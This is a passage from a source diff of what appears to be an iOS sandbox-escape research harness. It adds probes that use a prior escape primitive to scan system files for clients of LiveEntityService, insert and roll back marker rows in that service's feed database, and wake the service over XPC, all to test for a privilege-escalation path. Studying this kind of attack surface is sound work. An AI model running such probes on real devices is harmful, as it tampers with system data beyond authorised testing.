+            [[pl description] UTF8String] ?: "(unparseable)");
+    } else {
+        LOG("[bq16] Info.plist unreadable (errno %d)", errno);
+    }
+    fsync(fileno(stderr));
+
+    // 3. launchd wiring — parsed, not grep'ed: launchd plists are BINARY
+    //    plists, and the first version's [nil rangeOfString:] returned
+    //    {0,0} on every one of the 661 files, "matching" them all.
+    //    A match now requires the parsed Label/Program/MachServices to
+    //    actually contain the service name.
+    const char *lroots[] = { "/System/Library/LaunchDaemons",
+                             "/System/Library/LaunchAgents" };
+    const char *lname[] = { "com.apple.appintents.LiveEntityService",
+                            "LiveEntityService" };
+    int plistsSeen = 0, plistsDenied = 0, plistsUnparsed = 0,
+        plistsMatched = 0;
+    for (unsigned r = 0; r < 2; r++) {
+        DIR *d = opendir(lroots[r]);
+        if (!d) {
+            LOG("[bq16] opendir %s: errno %d", lroots[r], errno);
+            continue;
+        }
+        struct dirent *e;
+        while ((e = readdir(d))) {
+            if (!strstr(e->d_name, ".plist")) continue;
+            char p[1024];
+            snprintf(p, sizeof(p), "%s/%s", lroots[r], e->d_name);
+            NSString *ps = [NSString stringWithUTF8String:p];
+            NSData *pd = [NSData dataWithContentsOfFile:ps];
+            if (!pd) { plistsDenied++; continue; }
+            plistsSeen++;
+            id pl = [NSPropertyListSerialization propertyListWithData:pd
+                options:0 format:NULL error:nil];
+            if (![pl isKindOfClass:[NSDictionary class]]) {
+                plistsUnparsed++;
+                continue;
+            }
+            // Identity keys a launchd job uses to name its program.
+            NSMutableString *idtxt = [NSMutableString string];
+            for (NSString *k in @[ @"Label", @"Program", @"ProgramArguments",
+                                   @"MachServices", @"BundlePath" ]) {
+                id v = pl[k];
+                if (v) [idtxt appendFormat:@"%@ ", [v description]];
+            }
+            for (unsigned k = 0; k < 2; k++) {
+                NSString *nl = [NSString stringWithUTF8String:lname[k]];
+                if ([idtxt rangeOfString:nl].location != NSNotFound) {
+                    plistsMatched++;
+                    LOG("[bq16]   launchd MATCH %s", p);
+                    LOG("[bq16]     label: %s",
+                        [pl[@"Label"] description].UTF8String ?: "?");
+                    id args = pl[@"ProgramArguments"];
+                    for (id arg in ([args isKindOfClass:[NSArray class]]
+                                        ? args : @[]))
+                        LOG("[bq16]     arg: %s",
+                            [arg description].UTF8String);
+                    if (pl[@"UserName"])
+                        LOG("[bq16]     UserName: %s",
+                            [pl[@"UserName"] description].UTF8String);
+                    if (pl[@"Uid"]) LOG("[bq16]     Uid: %s",
+                        [pl[@"Uid"] description].UTF8String);
+                    fsync(fileno(stderr));
+                    break;
+                }
+            }
+        }
+        closedir(d);
+    }
+    LOG("[bq16] launchd plists: %d read, %d denied, %d unparsed, %d matched",
+        plistsSeen, plistsDenied, plistsUnparsed, plistsMatched);
+    fsync(fileno(stderr));
+
+    bad_query_release(h);
+    LOG("[bq16] done");
+}
+
+// ---------------------------------------------------------------------------
+// V176 (p_bq17): who TALKS to com.apple.appintents.LiveEntityService.
+//
+// bq16 named the owner (SQL schema + service identity). Privilege
+// relevance of the feed DB now depends on its CLIENTS: the service
+// runs JoinExistingSession (mobile, same tier as us), so tampering
+// with the DB is only interesting if a HIGHER-privilege process —
+// root knowledge/siri daemons — reads lnValue blobs through it.
+// The service name string must appear in every client's code that
+// connects (xpc_connection_create(service_name)), so a string scan
+// finds clients: on-disk bundles here, cache images via the same
+// needle added to bq14. Reuses bq15's walker verbatim (same magic
+// filter, same denial accounting) — a second walker would be a second
+// thing to validate (§144).
+// ---------------------------------------------------------------------------
+
+static void p_bq17(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq17] v176 LiveEntityService clients: on-disk string scan");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq17] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq17] done"); return; }
+
+    // Reset bq15's shared counters — they are phase-global, and a run
+    // reporting numbers from a previous phase is §144 territory.
+    bq15_scanned = bq15_denied = bq15_skipped = bq15_hits = 0;
+    bq15_hitFiles = [NSMutableSet set];
+
+    const char *needles[] = { "com.apple.appintents.LiveEntityService",
+                              "LiveEntityService.server",
+                              "LiveEntityService" };
+    const unsigned nneedles = 3;
+
+    const char *roots[] = { "/Applications", "/System/Applications",
+                            "/System/Library",
+                            "/usr/libexec" /* control: expect denials */ };
+    for (unsigned r = 0; r < sizeof(roots) / sizeof(roots[0]); r++) {
+        LOG("[bq17] root %s", roots[r]);
+        fsync(fileno(stderr));
+        NSString *rs = [NSString stringWithUTF8String:roots[r]];
+        struct stat st;
+        if (stat(rs.fileSystemRepresentation, &st) != 0) {
+            LOG("[bq17]   stat errno %d (missing)", errno);
+            continue;
+        }
+        int s0 = bq15_scanned, d0 = bq15_denied;
+        bq15_walk(rs, 0, needles, nneedles);
+        LOG("[bq17] root %s: +%d scanned, +%d denied", roots[r],
+            bq15_scanned - s0, bq15_denied - d0);
+        fsync(fileno(stderr));
+    }
+    LOG("[bq17] scanned=%d denied=%d hits=%d",
+        bq15_scanned, bq15_denied, bq15_hits);
+    fsync(fileno(stderr));
+
+    bad_query_release(h);
+    LOG("[bq17] done");
+}
+
+// ---------------------------------------------------------------------------
+// V176 (p_bq18): the first WRITE phase against the AppIntents feed DB —
+// INPUT vs OUTPUT, measured instead of guessed.
+//
+// What bq10/bq15/bq16 established: 8EB68272/db is created and managed
+// by com.apple.appintents.LiveEntityService (its binary holds the whole
+// schema: CREATE TABLE/REPLACE INTO/DELETE FROM bootId != ?), and the
+// daemon clients (callservicesd, mediaremoted, navd, mobiletimerd) push
+// feeds through it. The file is uid=501 mode=644 — OUR uid — so the
+// sandboxed app can plausibly open it read-WRITE through the same
+// §170 escape point that reads it.
+//
+// The discriminating observation: a marker row inserted by us that
+// DISAPPEARS (or is repaired) proves a daemon re-read the file — the DB
+// is INPUT to it. A marker that survives a window in which the service
+// demonstrably rewrote other parts (mtime moved) proves the rewrite did
+// not consume our row — OUTPUT-only for the marker's path. The window
+// carries its own control: if no write activity happens at all, the run
+// is INCONCLUSIVE and says so (§144 — a quiet detector is not a
+// negative result).
+//
+// Discipline (§175/§180): control -> verified byte-level backup ->
+// detectable change -> bounded observation -> byte-identical rollback
+// -> verification that both the bytes AND the row counts came back.
+// The insert is built from PRAGMA table_info so the column list cannot
+// drift from the real schema; a failed insert rolls the transaction
+// back immediately and skips to verification with zero changes.
+// ---------------------------------------------------------------------------
+
+static BOOL bq18_copy(NSString *src, NSString *dst) {
+    NSData *d = [NSData dataWithContentsOfFile:src];
+    if (!d) return NO;
+    return [d writeToFile:dst atomically:NO];
+}
+static BOOL bq18_same(NSString *a, NSString *b) {
+    NSData *da = [NSData dataWithContentsOfFile:a];
+    NSData *db2 = [NSData dataWithContentsOfFile:b];
+    return da && db2 && [da isEqualToData:db2];
+}
+static int bq18_count(sqlite3 *db, const char *sql) {
+    sqlite3_stmt *s = NULL;
+    int n = -1;
+    if (sqlite3_prepare_v2(db, sql, -1, &s, NULL) == SQLITE_OK &&
+        sqlite3_step(s) == SQLITE_ROW)
+        n = sqlite3_column_int(s, 0);
+    if (s) sqlite3_finalize(s);
+    return n;
+}
+
+static void p_bq18(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq18] v176 feed-DB write probe: marker row in/out (§175/§180)");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq18] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq18] done"); return; }
+
+    NSString *dir = @"/var/containers/Data/System/"
+        "8EB68272-6502-49E9-B688-25CA4774CFE4";
+    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
+    NSString *walp = [dbp stringByAppendingString:@"-wal"];
+    NSString *shmPath = [dbp stringByAppendingString:@"-shm"];
+    NSArray *files = @[ dbp, walp, shmPath ];
+
+    // ---- CONTROL: ownership, presence, counts, and a working READ
+    // (a phase that cannot read cannot report on a write).
+    struct stat st = {0};
+    if (stat(dbp.fileSystemRepresentation, &st) != 0) {
+        LOG("[bq18] CONTROL db stat errno %d — aborting, target gone", errno);
+        bad_query_release(h); LOG("[bq18] done"); return;
+    }
+    LOG("[bq18] CONTROL db: %lld bytes uid=%d gid=%d mode=%o our-uid=%d%s",
+        (long long)st.st_size, (int)st.st_uid, (int)st.st_gid,
+        (unsigned)(st.st_mode & 0777), (int)getuid(),
+        ((int)st.st_uid == (int)getuid() && (st.st_mode & 0200))
+            ? " -> owner-writable by us" : " -> NOT writable by us");
+    fsync(fileno(stderr));
+
+    sqlite3 *db = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &db, SQLITE_OPEN_READONLY,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq18] CONTROL readonly open failed: %s — aborting",
+            db ? sqlite3_errmsg(db) : "?");
+        if (db) sqlite3_close(db);
+        bad_query_release(h); LOG("[bq18] done"); return;
+    }
+    int ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+    int meta0 = bq18_count(db, "SELECT count(*) FROM feedMetadata");
+    LOG("[bq18] CONTROL rows: feedEntries=%d feedMetadata=%d", ent0, meta0);
+    fsync(fileno(stderr));
+    sqlite3_close(db);
+    if (ent0 < 0 || meta0 < 0) {
+        LOG("[bq18] CONTROL counts unreadable — detector broken, aborting");
+        bad_query_release(h); LOG("[bq18] done"); return;
+    }
+
+    // ---- BACKUP: byte-level, verified by re-reading every file.
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *bdir = [docs stringByAppendingPathComponent:@"bq18-backup"];
+    [[NSFileManager defaultManager] removeItemAtPath:bdir error:NULL];
+    [[NSFileManager defaultManager] createDirectoryAtPath:bdir
+        withIntermediateDirectories:YES attributes:nil error:NULL];
+    BOOL backupOK = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) {
+            LOG("[bq18] BACKUP absent: %s (fine if the service never "
+                "created it)", f.lastPathComponent.UTF8String);
+            continue;
+        }
+        NSString *dst = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_copy(f, dst) || !bq18_same(f, dst)) {
+            backupOK = NO;
+            LOG("[bq18] BACKUP FAIL for %s", f.lastPathComponent.UTF8String);
+        }
+    }
+    LOG("[bq18] BACKUP %s at %s", backupOK ? "verified" : "BROKEN",
+        bdir.UTF8String);
+    fsync(fileno(stderr));
+    if (!backupOK) {
+        LOG("[bq18] no verified backup — refusing to write");
+        bad_query_release(h); LOG("[bq18] done"); return;
+    }
+
+    // ---- CHANGE: insert marker rows using the REAL column list.
+    sqlite3 *wdb = NULL;
+    int wrc = sqlite3_open_v2(dbp.UTF8String, &wdb,
+        SQLITE_OPEN_READWRITE, NULL);
+    if (wrc != SQLITE_OK) {
+        LOG("[bq18] WRITE open rc=%d (%s) — route closed (no write access)",
+            wrc, wdb ? sqlite3_errmsg(wdb) : "?");
+        if (wdb) sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq18] done"); return;
+    }
+    // Exact column names from the live schema — never from memory of a
+    // context dump: "entityId" vs "entityID" would fail silently here.
+    NSMutableArray *entCols = [NSMutableArray array];
+    sqlite3_stmt *ti = NULL;
+    if (sqlite3_prepare_v2(wdb, "PRAGMA table_info(feedEntries)", -1, &ti,
+                           NULL) == SQLITE_OK)
+        while (sqlite3_step(ti) == SQLITE_ROW)
+            [entCols addObject:[NSString stringWithUTF8String:
+                (const char *)sqlite3_column_text(ti, 1)]];
+    if (ti) sqlite3_finalize(ti);
+    NSMutableArray *metaCols = [NSMutableArray array];
+    if (sqlite3_prepare_v2(wdb, "PRAGMA table_info(feedMetadata)", -1, &ti,
+                           NULL) == SQLITE_OK)
+        while (sqlite3_step(ti) == SQLITE_ROW)
+            [metaCols addObject:[NSString stringWithUTF8String:
+                (const char *)sqlite3_column_text(ti, 1)]];
+    if (ti) sqlite3_finalize(ti);
+    LOG("[bq18] schema feedEntries=(%s) feedMetadata=(%s)",
+        [[entCols componentsJoinedByString:@","] UTF8String],
+        [[metaCols componentsJoinedByString:@","] UTF8String]);
+    fsync(fileno(stderr));
+    if (entCols.count == 0 || metaCols.count == 0) {
+        LOG("[bq18] schema unreadable — aborting, no blind INSERT");
+        sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq18] done"); return;
+    }
+
+    // Value by column name; blob/unknown columns get 'fz29' text except
+    // the two known NULLable blobs — NOT NULL columns must be filled or
+    // the insert itself is a bad argument, not a result.
+    NSString *(^valFor)(NSString *) = ^NSString *(NSString *c) {
+        if ([c isEqualToString:@"feedId"])    return @"fz29.probe";
+        if ([c isEqualToString:@"bootId"])    return @"FZ29-BOOT-PROBE";
+        if ([c isEqualToString:@"bundleId"])  return @"com.fz29.probe";
+        if ([c hasPrefix:@"entity"] || [c hasPrefix:@"Entity"])
+            return @"FZ29ProbeEntity/fz29";
+        if ([c isEqualToString:@"lastUpdate"])
+            return @"2099-01-01T00:00:00.000";
+        if ([c isEqualToString:@"lnValue"])
+            // NOT NULL (the first INSERT died on exactly this constraint):
+            // opaque payload the service decodes with a guarded path
+            // ("Unable to decode metadata for %s::%s" is its own log
+            // string — malformed data is an expected input there).
+            return @"fz29-probe";
+        if ([c isEqualToString:@"metadata"])
+            return nil; // NULL (live rows carry metadata=NULL, §176)
+        return @"fz29";
+    };
+    NSMutableString *cols = [NSMutableString string];
+    NSMutableString *vals = [NSMutableString string];
+    for (NSString *c in entCols) {
+        NSString *v = valFor(c);
+        [cols appendFormat:@"%@%@", cols.length ? @"," : @"", c];
+        [vals appendFormat:@"%@%@", vals.length ? @"," : @"",
+            v ? [NSString stringWithFormat:@"'%@'", v] : @"NULL"];
+    }
+    NSString *insEnt = [NSString stringWithFormat:
+        @"INSERT INTO feedEntries (%@) VALUES (%@)", cols, vals];
+    NSMutableString *mcols = [NSMutableString string];
+    NSMutableString *mvals = [NSMutableString string];
+    for (NSString *c in metaCols) {
+        NSString *v = valFor(c);
+        [mcols appendFormat:@"%@%@", mcols.length ? @"," : @"", c];
+        [mvals appendFormat:@"%@%@", mvals.length ? @"," : @"",
+            v ? [NSString stringWithFormat:@"'%@'", v] : @"NULL"];
+    }
+    NSString *insMeta = [NSString stringWithFormat:
+        @"INSERT INTO feedMetadata (%@) VALUES (%@)", mcols, mvals];
+
+    char *err = NULL;
+    int changed = 0;
+    sqlite3_exec(wdb, "BEGIN IMMEDIATE", NULL, NULL, &err);
+    int rc1 = sqlite3_exec(wdb, insEnt.UTF8String, NULL, NULL, &err);
+    if (rc1 == SQLITE_OK) {
+        int rc2 = sqlite3_exec(wdb, insMeta.UTF8String, NULL, NULL, &err);
+        if (rc2 == SQLITE_OK) changed = 1;
+        else LOG("[bq18] WRITE feedMetadata rc=%d: %s", rc2, err ?: "?");
+    } else {
+        LOG("[bq18] WRITE feedEntries rc=%d: %s", rc1, err ?: "?");
+    }
+    if (err) { sqlite3_free(err); err = NULL; }
+    if (!changed) {
+        sqlite3_exec(wdb, "ROLLBACK", NULL, NULL, NULL);
+        LOG("[bq18] WRITE rolled back — zero changes left, skipping to "
+            "verify");
+    } else {
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+        LOG("[bq18] WRITE committed: marker=%d",
+            bq18_count(wdb, "SELECT count(*) FROM feedEntries "
+                            "WHERE feedId='fz29.probe'"));
+    }
+    fsync(fileno(stderr));
+
+    // ---- OBSERVE: bounded window; activity and marker fate both logged.
+    // Inconclusive is a first-class outcome: if the service never
+    // touched the file during the window, absence of reaction proves
+    // nothing (§144).
+    int markerGoneAt = -1, writerTouched = 0;
+    struct stat prev = {0};
+    stat(dbp.fileSystemRepresentation, &prev);
+    if (changed) {
+        for (int t = 0; t < 45; t++) {
+            usleep(1000 * 1000);
+            struct stat cur = {0};
+            if (stat(dbp.fileSystemRepresentation, &cur) == 0) {
+                if (cur.st_mtime != prev.st_mtime ||
+                    cur.st_size != prev.st_size) {
+                    writerTouched++;
+                    LOG("[bq18] OBS t=%ds db CHANGED (mtime %lld->%lld "
+                        "size %lld->%lld)", t, (long long)prev.st_mtime,
+                        (long long)cur.st_mtime, (long long)prev.st_size,
+                        (long long)cur.st_size);
+                    prev = cur;
+                }
+            }
+            int m = bq18_count(wdb,
+                "SELECT count(*) FROM feedEntries WHERE feedId='fz29.probe'");
+            if (m == 0 && markerGoneAt < 0) {
+                markerGoneAt = t;
+                LOG("[bq18] OBS t=%ds MARKER DELETED BY SOMEONE ELSE", t);
+            }
+            fsync(fileno(stderr));
+        }
+        LOG("[bq18] OBS done: writer-activity=%d marker-fate=%s",
+            writerTouched,
+            markerGoneAt >= 0 ? "deleted by service"
+                : (writerTouched > 0 ? "survived a rewriting service"
+                                     : "inconclusive: file never touched"));
+    }
+    fsync(fileno(stderr));
+
+    // ---- ROLLBACK: remove our rows, restore the original bytes.
+    if (changed) {
+        sqlite3_exec(wdb, "DELETE FROM feedEntries WHERE feedId='fz29.probe'",
+                     NULL, NULL, NULL);
+        sqlite3_exec(wdb, "DELETE FROM feedMetadata WHERE feedId='fz29.probe'",
+                     NULL, NULL, NULL);
+        sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+    }
+    sqlite3_close(wdb);
+
+    BOOL bytesBack = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *bak = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_same(f, bak)) {
+            if (!bq18_copy(bak, f)) {
+                bytesBack = NO;
+                LOG("[bq18] RESTORE FAIL %s", f.lastPathComponent.UTF8String);
+            }
+        }
+    }
+    // -journal, if the rollback created one, must not shadow the db.
+    NSString *jrnl = [dbp stringByAppendingString:@"-journal"];
+    [[NSFileManager defaultManager] removeItemAtPath:jrnl error:NULL];
+    int ent1 = -1, meta1 = -1;
+    sqlite3 *vdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &vdb, SQLITE_OPEN_READONLY,
+                        NULL) == SQLITE_OK) {
+        ent1 = bq18_count(vdb, "SELECT count(*) FROM feedEntries");
+        meta1 = bq18_count(vdb, "SELECT count(*) FROM feedMetadata");
+        sqlite3_close(vdb);
+    }
+    bytesBack = bytesBack && bq18_same(dbp, [bdir stringByAppendingPathComponent:@"db"]);
+    LOG("[bq18] VERIFY rows back: feedEntries=%d/%d feedMetadata=%d/%d "
+        "bytes-identical=%d", ent0, ent1, meta0, meta1, bytesBack ? 1 : 0);
+    LOG("[bq18] done");
+    fsync(fileno(stderr));
+    bad_query_release(h);
+}
+
+// ---------------------------------------------------------------------------
+// V176 (p_bq19): wake the owner ourselves.
+//
+// bq18 inserted the marker cleanly (write access CONFIRMED, rollback
+// byte-identical) but got "inconclusive: file never touched" — during
+// 45 s no client of LiveEntityService (callservicesd / mediaremoted /
+// navd / mobiletimerd, bq17) generated a feed event, so the service
+// never opened the DB. A quiet window proves nothing (§144), so this
+// phase manufactures the missing event: connect to the XPC service BY
+// NAME — xpc_connection_create() asks launchd to spawn it, and service
+// startup is exactly where the schema's bootId cleanup
+// ("DELETE FROM feedEntries WHERE bootId != ?") and the startup PRAGMAs
+// run. Two outcomes are both results:
+//
+//   - marker disappears / db mtime moves after our connection → the
+//     service re-reads the DB on start → INPUT to a service fed by
+//     unsandboxed daemons (bq17), and we can trigger its parser;
+//   - connection refused (sandbox) or service starts but ignores the
+//     marker → both facts logged; XPC-by-name is closed, and INPUT
+//     must come from real client traffic instead.
+//
+// Same §175/§180 discipline as bq18: control -> verified backup ->
+// marker -> connection + bounded observation -> byte-identical
+// rollback -> verify. Schema columns are hardcoded from bq18's live
+// PRAGMA table_info output (feedEntries(feedId,bootId,bundleId,
+// entityId,lastUpdate,lnValue,metadata), feedMetadata(feedId,lastUpdate),
+// lnValue NOT NULL) — a wrong column would fail the INSERT loudly, and
+// the failure path rolls back with zero changes.
+// ---------------------------------------------------------------------------
+
+static void p_bq19(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq19] v176 wake LiveEntityService via XPC + marker (§175/§180)");
+
+    int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+    LOG("[bq19] CONTROL §170 point -> handle %lld%s", (long long)h,
+        h < 0 ? "  *** NO ESCAPE — aborting ***" : "");
+    fsync(fileno(stderr));
+    if (h < 0) { LOG("[bq19] done"); return; }
+
+    NSString *dir = @"/var/containers/Data/System/"
+        "8EB68272-6502-49E9-B688-25CA4774CFE4";
+    NSString *dbp = [dir stringByAppendingPathComponent:@"db"];
+    NSString *walp = [dbp stringByAppendingString:@"-wal"];
+    NSString *shmPath = [dbp stringByAppendingString:@"-shm"];
+    NSArray *files = @[ dbp, walp, shmPath ];
+
+    sqlite3 *db = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &db, SQLITE_OPEN_READONLY,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq19] CONTROL readonly open failed: %s — aborting",
+            db ? sqlite3_errmsg(db) : "?");
+        if (db) sqlite3_close(db);
+        bad_query_release(h); LOG("[bq19] done"); return;
+    }
+    int ent0 = bq18_count(db, "SELECT count(*) FROM feedEntries");
+    int meta0 = bq18_count(db, "SELECT count(*) FROM feedMetadata");
+    sqlite3_close(db);
+    LOG("[bq19] CONTROL rows: feedEntries=%d feedMetadata=%d", ent0, meta0);
+    fsync(fileno(stderr));
+    if (ent0 < 0 || meta0 < 0) {
+        LOG("[bq19] CONTROL unreadable — detector broken, aborting");
+        bad_query_release(h); LOG("[bq19] done"); return;
+    }
+
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+    NSString *bdir = [docs stringByAppendingPathComponent:@"bq19-backup"];
+    [[NSFileManager defaultManager] removeItemAtPath:bdir error:NULL];
+    [[NSFileManager defaultManager] createDirectoryAtPath:bdir
+        withIntermediateDirectories:YES attributes:nil error:NULL];
+    BOOL backupOK = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *dst = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_copy(f, dst) || !bq18_same(f, dst)) backupOK = NO;
+    }
+    LOG("[bq19] BACKUP %s", backupOK ? "verified" : "BROKEN");
+    fsync(fileno(stderr));
+    if (!backupOK) {
+        LOG("[bq19] no verified backup — refusing to write");
+        bad_query_release(h); LOG("[bq19] done"); return;
+    }
+
+    // ---- marker (schema from bq18's live PRAGMA, lnValue NOT NULL)
+    sqlite3 *wdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &wdb, SQLITE_OPEN_READWRITE,
+                        NULL) != SQLITE_OK) {
+        LOG("[bq19] WRITE open failed (%s) — no write access",
+            wdb ? sqlite3_errmsg(wdb) : "?");
+        if (wdb) sqlite3_close(wdb);
+        bad_query_release(h); LOG("[bq19] done"); return;
+    }
+    char *err = NULL;
+    int changed = 0;
+    if (sqlite3_exec(wdb, "BEGIN IMMEDIATE", NULL, NULL, &err) == SQLITE_OK) {
+        const char *ins1 =
+            "INSERT INTO feedEntries (feedId,bootId,bundleId,entityId,"
+            "lastUpdate,lnValue,metadata) VALUES ('fz29.probe',"
+            "'FZ29-BOOT-PROBE','com.fz29.probe','FZ29ProbeEntity/fz29',"
+            "'2099-01-01T00:00:00.000','fz29-probe',NULL)";
+        const char *ins2 =
+            "INSERT INTO feedMetadata (feedId,lastUpdate) VALUES "
+            "('fz29.probe','2099-01-01T00:00:00.000')";
+        int r1 = sqlite3_exec(wdb, ins1, NULL, NULL, &err);
+        int r2 = r1;
+        if (r1 == SQLITE_OK) r2 = sqlite3_exec(wdb, ins2, NULL, NULL, &err);
+        if (r1 == SQLITE_OK && r2 == SQLITE_OK) {
+            sqlite3_exec(wdb, "COMMIT", NULL, NULL, NULL);
+            changed = 1;
+        } else {
+            LOG("[bq19] WRITE failed rc=%d/%d: %s", r1, r2, err ?: "?");
+            sqlite3_exec(wdb, "ROLLBACK", NULL, NULL, NULL);
+        }
+        if (err) { sqlite3_free(err); err = NULL; }
+    }
+    LOG("[bq19] marker=%d%s",
+        changed ? bq18_count(wdb,
+            "SELECT count(*) FROM feedEntries WHERE feedId='fz29.probe'") : -1,
+        changed ? "" : " (NOT inserted — rollback path)");
+    fsync(fileno(stderr));
+
+    // ---- XPC: two plausible names, connection outcome fully logged.
+    __block int xpcErrors = 0;
+    dispatch_queue_t q = dispatch_queue_create("bq19.xpc",
+        DISPATCH_QUEUE_SERIAL);
+    const char *svcNames[] = { "com.apple.appintents.LiveEntityService",
+                               "com.apple.appintents.LiveEntityService.server" };
+    xpc_connection_t conns[2] = { NULL, NULL };
+    for (unsigned i = 0; i < 2; i++) {
+        xpc_connection_t c = xpc_connection_create(svcNames[i], q);
+        if (!c) {
+            LOG("[bq19] XPC create(%s) -> NULL", svcNames[i]);
+            continue;
+        }
+        const char *nm = svcNames[i];
+        xpc_connection_set_event_handler(c, ^(xpc_object_t ev) {
+            char *ds = xpc_copy_description(ev);
+            LOG("[bq19] XPC[%s] event: %s", nm, ds ?: "?");
+            free(ds);
+            if (xpc_get_type(ev) == XPC_TYPE_ERROR) __sync_fetch_and_add(&xpcErrors, 1);
+            fsync(fileno(stderr));
+        });
+        xpc_connection_resume(c);
+        conns[i] = c;
+        LOG("[bq19] XPC[%s] resume (async outcome below)", nm);
+        fsync(fileno(stderr));
+    }
+    usleep(700 * 1000);
+    // A benign dictionary: unknown methods get logged by the service's
+    // error path rather than crashing a well-formed XPC interface, and
+    // even the act of sending forces launchd to spawn the target.
+    for (unsigned i = 0; i < 2; i++) {
+        if (!conns[i]) continue;
+        xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
+        xpc_dictionary_set_string(msg, "method", "ping");
+        xpc_connection_send_message(conns[i], msg);
+    }
+
+    // ---- observe: marker fate + db mutations
+    int markerGoneAt = -1, writerTouched = 0;
+    struct stat prev = {0};
+    stat(dbp.fileSystemRepresentation, &prev);
+    for (int t = 0; changed && t < 120; t++) {
+        usleep(1000 * 1000);
+        struct stat cur = {0};
+        if (stat(dbp.fileSystemRepresentation, &cur) == 0 &&
+            (cur.st_mtime != prev.st_mtime || cur.st_size != prev.st_size)) {
+            writerTouched++;
+            LOG("[bq19] OBS t=%ds db CHANGED (mtime %lld->%lld size %lld->%lld)",
+                t, (long long)prev.st_mtime, (long long)cur.st_mtime,
+                (long long)prev.st_size, (long long)cur.st_size);
+            prev = cur;
+        }
+        int m = bq18_count(wdb,
+            "SELECT count(*) FROM feedEntries WHERE feedId='fz29.probe'");
+        if (m == 0 && markerGoneAt < 0) {
+            markerGoneAt = t;
+            LOG("[bq19] OBS t=%ds MARKER DELETED BY SOMEONE ELSE", t);
+        }
+        if ((t % 10) == 9) fsync(fileno(stderr));
+    }
+    if (changed) {
+        LOG("[bq19] OBS done: writer-activity=%d xpc-errors=%d marker=%s",
+            writerTouched, xpcErrors,
+            markerGoneAt >= 0 ? "deleted by service"
+                : (writerTouched > 0 ? "survived a rewriting service"
+                    : "inconclusive: file never touched"));
+        fsync(fileno(stderr));
+    }
+
+    // ---- rollback + byte-identical verify (bq18 pattern)
+    if (changed) {
+        sqlite3_exec(wdb, "DELETE FROM feedEntries WHERE feedId='fz29.probe'",
+                     NULL, NULL, NULL);
+        sqlite3_exec(wdb, "DELETE FROM feedMetadata WHERE feedId='fz29.probe'",
+                     NULL, NULL, NULL);
+    }
+    sqlite3_close(wdb);
+    for (unsigned i = 0; i < 2; i++)
+        if (conns[i]) xpc_connection_cancel(conns[i]);
+
+    BOOL bytesBack = YES;
+    for (NSString *f in files) {
+        struct stat fs2;
+        if (stat(f.fileSystemRepresentation, &fs2) != 0) continue;
+        NSString *bak = [bdir stringByAppendingPathComponent:
+            f.lastPathComponent];
+        if (!bq18_same(f, bak) && !bq18_copy(bak, f)) bytesBack = NO;
+    }
+    [[NSFileManager defaultManager] removeItemAtPath:
+        [dbp stringByAppendingString:@"-journal"] error:NULL];
+    int ent1 = -1, meta1 = -1;
+    sqlite3 *vdb = NULL;
+    if (sqlite3_open_v2(dbp.UTF8String, &vdb, SQLITE_OPEN_READONLY,
+                        NULL) == SQLITE_OK) {
+        ent1 = bq18_count(vdb, "SELECT count(*) FROM feedEntries");
+        meta1 = bq18_count(vdb, "SELECT count(*) FROM feedMetadata");
+        sqlite3_close(vdb);
+    }
+    bytesBack = bytesBack && bq18_same(dbp,
+        [bdir stringByAppendingPathComponent:@"db"]);
+    LOG("[bq19] VERIFY rows back: feedEntries=%d/%d feedMetadata=%d/%d "
+        "bytes-identical=%d", ent0, ent1, meta0, meta1, bytesBack ? 1 : 0);
+    LOG("[bq19] done");
+    fsync(fileno(stderr));
+    bad_query_release(h);
+}
+
+// ---------------------------------------------------------------------------
 // V171 (p_netv6): the kernel network surface §146 could not reach, asked
 // through the sockets an app is actually allowed to create.
 //
@@ -31202,6 +33346,16 @@ void *t_iosurface_scaler(void *arg) {
             getenv("FUZZ_BQ9_ROLLBACK")) {
             p_bq9(); LOG("[probe13] bq9-only mode, stop"); return NULL;
         }
